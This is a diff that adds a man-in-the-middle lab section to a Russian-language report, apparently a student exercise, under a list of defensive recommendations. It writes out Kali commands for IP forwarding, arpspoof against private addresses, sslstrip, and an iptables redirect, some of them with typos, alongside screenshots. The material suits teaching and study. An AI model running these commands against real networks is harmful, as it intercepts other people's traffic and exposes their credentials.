@@ -100,8 +100,37 @@
 5. Внедрить многофакторную аутентификацию (MFA)
 6. Никогда не передавать конфиденциальные данные в открытом виде на прикладном уровне
 
+открыл проект через 192.168.0.11:
+   <img width="2547" height="1599" alt="image" src="https://github.com/user-attachments/assets/603dfbcc-5fa2-4021-a694-bbf4e4746161" />
+
+команды в кали:
+$ echo 1 sudo tee /proc/sys/net/ipv4/ip_
+forward:
+
 <img width="633" height="268" alt="image" src="https://github.com/user-attachments/assets/3b83eed6-62cb-4eea-866f-a57c170b8377" />
 
+sudo arpspoof -i etho -t 172. 17.10.186 172.17.10.89:
+
 <img width="633" height="353" alt="image" src="https://github.com/user-attachments/assets/f586b01e-981c-46d2-b287-f0f7382eb5ca" />
+
+zsh: corrupt history file /home/kali/.zsh_history
+(kali@kali)-[~]
+sudo sslstrip -l 8080 -k
+[sudo] password for kali:
+sslstrip 1.0 by Moxie Marlinspike running …:
+
+
+<img width="586" height="338" alt="image" src="https://github.com/user-attachments/assets/9e78cb05-7647-4493-8934-1ee12f571690" />
+
+sudo iptables -t nat -A PREROUTING -p tcp --dport 5000 -j REDIRECT --to-port 8080:
+
+<img width="948" height="391" alt="image" src="https://github.com/user-attachments/assets/6e181513-0222-4b45-b558-d531a726fd73" />
+
+результат во втором терминале:
+<img width="930" height="549" alt="image" src="https://github.com/user-attachments/assets/afc31f95-26e7-4371-85b2-1986f649e117" />
+
+
+
+
 
 
